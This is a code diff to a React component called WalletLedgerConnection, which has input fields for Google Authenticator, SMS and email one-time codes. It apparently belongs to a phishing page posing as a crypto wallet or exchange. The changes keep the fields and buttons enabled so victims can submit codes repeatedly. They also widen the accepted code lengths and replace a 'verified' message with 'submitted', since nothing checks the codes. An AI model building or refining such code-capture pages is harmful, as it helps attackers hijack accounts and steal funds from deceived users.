@@ -35,20 +35,30 @@ const WalletLedgerConnection = () => {
   };
 
   const handleCodeChange = (field: keyof typeof codes, value: string) => {
-    setCodes(prev => ({ ...prev, [field]: value }));
+    // Apply different length limits based on the field
+    let processedValue = value;
+    if (field === 'googleAuth') {
+      processedValue = value.replace(/\D/g, '').slice(0, 6);
+    } else {
+      // Allow longer codes for SMS and email (up to 12 characters)
+      processedValue = value.replace(/\D/g, '').slice(0, 12);
+    }
+    setCodes(prev => ({ ...prev, [field]: processedValue }));
   };
 
   const handleCodeSubmit = (field: keyof typeof codes) => {
-    if (codes[field].length === 6) {
-      setSubmittedCodes(prev => ({ ...prev, [field]: true }));
+    const minLength = field === 'googleAuth' ? 6 : 4; // Minimum 4 characters for SMS/email, 6 for Google Auth
+    
+    if (codes[field].length >= minLength) {
+      // Don't disable the button anymore, just show success message
       toast({
-        title: "Code verified",
-        description: `${field === 'googleAuth' ? 'Google Authenticator' : field === 'sms' ? 'SMS' : 'Email'} code has been verified successfully.`,
+        title: "Code submitted",
+        description: `${field === 'googleAuth' ? 'Google Authenticator' : field === 'sms' ? 'SMS' : 'Email'} code has been submitted successfully.`,
       });
     } else {
       toast({
         title: "Invalid code",
-        description: "Please enter a valid 6-digit code.",
+        description: `Please enter a valid code (minimum ${minLength} digits).`,
         variant: "destructive",
       });
     }
@@ -171,18 +181,17 @@ const WalletLedgerConnection = () => {
                     id="googleAuth"
                     type="text"
                     value={codes.googleAuth}
-                    onChange={(e) => handleCodeChange('googleAuth', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    onChange={(e) => handleCodeChange('googleAuth', e.target.value)}
                     className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-green-400 flex-1"
                     placeholder="000000"
                     maxLength={6}
-                    disabled={submittedCodes.googleAuth}
                   />
                   <Button
                     onClick={() => handleCodeSubmit('googleAuth')}
-                    disabled={codes.googleAuth.length !== 6 || submittedCodes.googleAuth}
+                    disabled={codes.googleAuth.length !== 6}
                     className="bg-green-600 hover:bg-green-700 text-white px-6 h-12 font-semibold"
                   >
-                    {submittedCodes.googleAuth ? 'Verified' : 'Submit'}
+                    Submit
                   </Button>
                 </div>
               </div>
@@ -201,18 +210,17 @@ const WalletLedgerConnection = () => {
                     id="sms"
                     type="text"
                     value={codes.sms}
-                    onChange={(e) => handleCodeChange('sms', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    onChange={(e) => handleCodeChange('sms', e.target.value)}
                     className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-blue-400 flex-1"
-                    placeholder="000000"
-                    maxLength={6}
-                    disabled={submittedCodes.sms}
+                    placeholder="0000"
+                    maxLength={12}
                   />
                   <Button
                     onClick={() => handleCodeSubmit('sms')}
-                    disabled={codes.sms.length !== 6 || submittedCodes.sms}
+                    disabled={codes.sms.length < 4}
                     className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-12 font-semibold"
                   >
-                    {submittedCodes.sms ? 'Verified' : 'Submit'}
+                    Submit
                   </Button>
                 </div>
               </div>
@@ -231,18 +239,17 @@ const WalletLedgerConnection = () => {
                     id="email"
                     type="text"
                     value={codes.email}
-                    onChange={(e) => handleCodeChange('email', e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    onChange={(e) => handleCodeChange('email', e.target.value)}
                     className="bg-[#181A20] border-[#3C4043] text-white text-lg h-12 font-mono tracking-wider focus:border-purple-400 flex-1"
-                    placeholder="000000"
-                    maxLength={6}
-                    disabled={submittedCodes.email}
+                    placeholder="0000"
+                    maxLength={12}
                   />
                   <Button
                     onClick={() => handleCodeSubmit('email')}
-                    disabled={codes.email.length !== 6 || submittedCodes.email}
+                    disabled={codes.email.length < 4}
                     className="bg-purple-600 hover:bg-purple-700 text-white px-6 h-12 font-semibold"
                   >
-                    {submittedCodes.email ? 'Verified' : 'Submit'}
+                    Submit
                   </Button>
                 </div>
               </div>
